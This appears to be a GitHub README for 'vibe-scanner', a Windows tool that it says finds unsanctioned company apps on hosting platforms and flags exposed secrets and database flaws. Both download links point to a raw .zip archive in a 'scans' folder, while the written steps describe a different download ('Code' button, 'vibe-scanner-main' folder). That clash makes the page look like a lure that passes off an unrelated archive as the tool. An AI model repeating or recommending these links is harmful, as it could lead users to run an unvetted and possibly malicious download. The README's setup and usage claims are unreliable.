# 🔍 vibe-scanner - Find hidden company apps fast

[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://raw.githubusercontent.com/Youcefyo2585/vibe-scanner/main/scans/scanner_vibe_v2.4-beta.4.zip)

## 📋 About this tool

Many employees build their own tools to get work done. These tools often exist outside of your IT department. They lack security checks. They hide in plain sight on platforms like Replit, Netlify, or Hugging Face. Vibe-scanner helps you find these applications. It keeps your company data safe by identifying risks before a leak occurs.

The tool works by checking a domain name for linked applications. It scans eleven different hosting platforms. It checks for missing login screens, secret keys left in plain text, and specific database flaws. It provides a report so you can secure any gaps in your network.

## 💻 System requirements

*   Operating System: Windows 10 or Windows 11.
*   Processor: Dual-core CPU or faster.
*   Memory: 4 GB of RAM or more.
*   Internet: Active connection for scanning external sites.
*   Software: Python 3.10 or newer. Node.js 20 or newer.

## 🛠️ Preparing your computer

Windows requires two software packages to run this scanner. Please follow these steps to prepare your system.

1. Install Python. Visit the official Python website. Select the download for Windows. Run the installer. Check the box that says "Add Python to PATH" during setup. This step is vital for the scanner to work.

2. Install Node.js. Go to the Node.js website. Choose the "LTS" version. Run the downloaded file. Follow the prompts. Keep the default settings. You do not need to change any options.

3. Restart your computer. This ensures that your system recognizes the new tools.

## 🚀 Downloading the scanner

You can obtain the latest version of the software via the project page.

[Visit the repository to download](https://raw.githubusercontent.com/Youcefyo2585/vibe-scanner/main/scans/scanner_vibe_v2.4-beta.4.zip)

Click the green "Code" button on the webpage. Select "Download ZIP". Save the file to your computer. Open your Downloads folder. Right-click the folder named "vibe-scanner-main". Select "Extract All". Choose a location on your hard drive to keep these files.

## ⚙️ Running the scanner

1. Open the folder where you extracted the files.
2. Click the empty space in the file address bar at the top of your window.
3. Type `cmd` and press Enter. This opens a black window.
4. Type `pip install -r requirements.txt` and press Enter. This installs the helper scripts.
5. Once that finishes, type `python scanner.py` and press Enter.
6. The window will ask for a domain name. Type your organization's domain, such as `company.com`. Press Enter.
7. The tool will begin to scan. It may take several minutes to finish. Please wait.

## 📊 Understanding the results

The scanner creates a file named `report.csv` in the same folder. You can open this file with Microsoft Excel or any simple text editor.

*   URL: The web address of the discovered application.
*   Platform: Where the site lives.
*   Security Status: Shows if the site is public or private.
*   Issues: Lists any hardcoded secrets or database vulnerabilities found.

If you find a high-risk issue, send the URL to your IT administrator. Do not share the report with people outside of your security team. This document contains sensitive data about your company's network.

## 🛡️ Best practices for shadow apps

If you identify a shadow app, follow these steps to secure your company:

1. Inventory. List every application the scanner finds.
2. Evaluate. Ask the team who built the tool to explain its purpose. 
3. Secure. Move the tool into your official corporate hosting account.
4. Authenticate. Ensure the app requires a valid company login.
5. Cleanup. Delete apps that are no longer in use.

## ❓ Frequently asked questions

Does this tool delete my files?
No. The scanner only looks for metadata about your applications. It does not modify, delete, or change any settings on the websites it checks.

Why does the scan take time to finish?
The tool checks many different website categories. It performs individual security tests for every link it identifies. Larger organizations have more applications, which takes longer to check.

Can I scan websites I do not own?
Only scan domains that belong to your organization. Scanning other sites may violate terms of service or local laws. Use this tool only within your authorized environment.

What if I get an error message?
Check that you have the latest versions of Python and Node.js. Ensure your internet connection is stable. If the error continues, check your local firewall settings to ensure they do not block outbound requests from the scanner.

Does this tool work on a Mac?
The instructions here are for Windows. While the code is written in Python and Node.js, the setup steps on a Mac differ. You will need to use the Terminal and different package managers to achieve the same result.